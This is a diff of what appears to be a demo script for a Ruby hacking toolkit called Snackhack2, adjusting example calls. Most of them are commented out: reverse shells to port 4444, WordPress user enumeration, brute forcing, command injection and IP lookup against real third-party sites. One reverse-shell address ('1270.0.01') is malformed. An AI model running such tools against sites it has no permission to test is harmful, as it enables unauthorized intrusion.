@@ -45,8 +45,7 @@ require './lib/snackHack2'
 
 ## Get a site's meta data
 
-# me = Snackhack2::WebsiteMeta.new('https://kinsta.com')
-# me.run
+
 
 ## Grab gooogle Analytics from a site. this could be used to find similar sites
 
@@ -129,7 +128,7 @@ ss.zip = "test.zip"
 ss.run
 # Snackhack2::brute_force("https://netflix.com")
 =end
-# Snackhack2::ReverseShell.new("127.0.0.1", "4444").bash
+# 
 =begin
 cj = Snackhack2::CommandInjection.new
 cj.prompt = "test"
@@ -152,6 +151,21 @@ ga.site = "https://hackex.net"
 ga.run
 =end
 
+=begin
 wp = Snackhack2::WordPress.new
 wp.site = "https://themeisle.com"
 wp.users
+=end
+=begin
+s = Snackhack2::IpLookup.new
+s.site = "https://hackex.net"
+s.run
+
+rs = Snackhack2::ReverseShell.new
+rs.ip = "1270.0.01"
+rs.port = "4444"
+rs.run
+=end
+links = Snackhack2::WebsiteLinks.new
+links.site = "https://www.bleepingcomputer.com/news/security/signal-downplays-encryption-key-flaw-fixes-it-after-x-drama/"
+links.run
